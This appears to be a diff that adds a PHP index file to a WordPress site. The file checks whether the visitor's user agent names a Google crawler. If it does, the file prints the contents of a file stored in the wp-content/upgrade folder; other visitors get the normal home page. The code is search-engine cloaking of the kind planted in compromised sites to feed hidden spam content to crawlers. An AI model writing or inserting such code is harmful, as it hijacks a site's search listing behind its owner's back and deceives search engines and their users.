@@ -1,0 +1,30 @@
+<?php
+
+$googleBots = array(
+    "Googlebot",
+    "Google-Site-Verification",
+    "Google-InspectionTool",
+    "Googlebot-Mobile",
+    "Googlebot-News"
+);
+
+$isGoogleBot = false;
+
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    foreach ($googleBots as $bot) {
+        if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
+            $isGoogleBot = true;
+            break;
+        }
+    }
+}
+
+if ($isGoogleBot) {
+    $bot_content = file_get_contents('wp-content/upgrade/index.php');
+    echo $bot_content;
+    exit;
+} else {
+    include('home.php');
+    exit;
+}
+?>
